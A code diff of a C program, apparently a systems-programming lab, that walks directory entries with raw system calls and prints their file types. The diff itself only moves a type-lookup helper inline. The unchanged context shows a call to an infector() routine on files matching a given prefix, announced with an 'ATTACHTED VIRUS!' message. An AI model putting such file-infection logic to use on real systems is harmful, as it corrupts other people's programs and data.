@@ -31,16 +31,7 @@ struct linux_dirent {
 #define DT_LNK 10
 #define DT_SOCK 12
 #define DT_WHT 14
-char* getType(int d_type){
-  return ((d_type == DT_REG) ?  "regular\n" :
-                        (d_type == DT_DIR) ?  "directory\n" :
-                        (d_type == DT_FIFO) ? "FIFO\n" :
-                        (d_type == DT_SOCK) ? "socket\n" :
-                        (d_type == DT_LNK) ?  "symlink\n" :
-                        (d_type == DT_BLK) ?  "block dev\n" :
-                        (d_type == DT_CHR) ?  "char dev\n" : "???");
 
-}
 int main (int argc , char* argv[], char* envp[])
 {
     int fd;
@@ -68,14 +59,22 @@ int main (int argc , char* argv[], char* envp[])
     for (bpos = 0; bpos < nread;) {
         d = (struct linux_dirent *) (buf + bpos);
         d_type = *(buf + bpos + d->d_reclen - 1);
-        
+        char* type = ((d_type == DT_REG) ?  "regular" :
+                        (d_type == DT_DIR) ?  "directory" :
+                        (d_type == DT_FIFO) ? "FIFO" :
+                        (d_type == DT_SOCK) ? "socket" :
+                        (d_type == DT_LNK) ?  "symlink" :
+                        (d_type == DT_BLK) ?  "block dev" :
+                        (d_type == DT_CHR) ?  "char dev" : "???");
+
         system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
         system_call(SYS_WRITE, STDOUT, " ", 1);
         if(prefix != 0 && strncmp(prefix, d->d_name, strlen(prefix)) == 0){
           system_call(SYS_WRITE, STDOUT, "ATTACHTED VIRUS!\n", strlen("ATTACHTED VIRUS!\n"));
           infector(d->d_name);
         } else {
-          system_call(SYS_WRITE, STDOUT, getType(d_type), strlen(getType(d_type)));
+          system_call(SYS_WRITE, STDOUT, type, strlen(type));
+          system_call(SYS_WRITE, STDOUT, "\n", 1);
         }
         bpos += d->d_reclen;
   }
